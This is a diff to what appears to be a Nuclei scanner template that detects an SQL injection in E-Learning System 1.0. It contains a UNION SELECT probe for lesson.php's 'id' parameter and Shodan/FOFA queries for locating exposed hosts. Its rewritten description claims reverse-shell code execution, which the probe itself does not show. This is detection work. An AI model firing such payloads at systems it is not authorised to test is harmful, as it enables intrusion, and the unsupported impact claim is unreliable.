@@ -1,30 +1,41 @@
-id: elearning-system-sqli
+id: CVE-2021-3239
 
 info:
-  name: E-Learning System 1.0 - 'id' SQL Injection
+  name: E-Learning System 1.0 - SQL Injection
   author: xuxeong
   severity: critical
   description: |
-    The E-Learning System version 1.0 suffers from an authenticated/unauthenticated SQL Injection vulnerability via the 'id' parameter in lesson.php. 
-    An attacker can exploit this to extract sensitive database information using UNION-based techniques.
+   E-Learning System 1.0 contains an unauthenticated SQL injection caused by unsanitized input, letting remote attackers execute arbitrary code on the server and gain a reverse shell, exploit requires no authentication.
+  impact: |
+   Attackers can execute arbitrary code on the server, leading to full system compromise and remote control.
+  remediation: |
+   Apply input validation and parameterized queries, update to the latest version if available.
   reference:
     - https://www.exploit-db.com/exploits/49434
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-89
   metadata:
     verified: true
-  tags: sqli,elearning,webapp
+    max-request: 2
+    shodan-query: http.title:"E-Learning System"
+    fofa-query: title="E-Learning System"
+  tags: sqli,elearning,vuln,unauth
 
 http:
   - method: GET
     path:
+      - "{{BaseURL}}/caiwl/lesson.php?id=-1%20UNION%20SELECT%201,2,md5(123),4,5"
       - "{{BaseURL}}/lesson.php?id=-1%20UNION%20SELECT%201,2,md5(123),4,5"
-
-    matchers-condition: and
+ 
+    stop-at-first-match: true
+ 
     matchers:
-      - type: word
-        words:
-          - "202cb962ac59075b964b07152d234b70"
-        part: body
-
-      - type: status
-        status:
-          - 200
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "202cb962ac59075b964b07152d234b70")'
+          - 'contains(content_type, "text/html")'
+          - 'contains(header, "PHP")'
+        condition: and
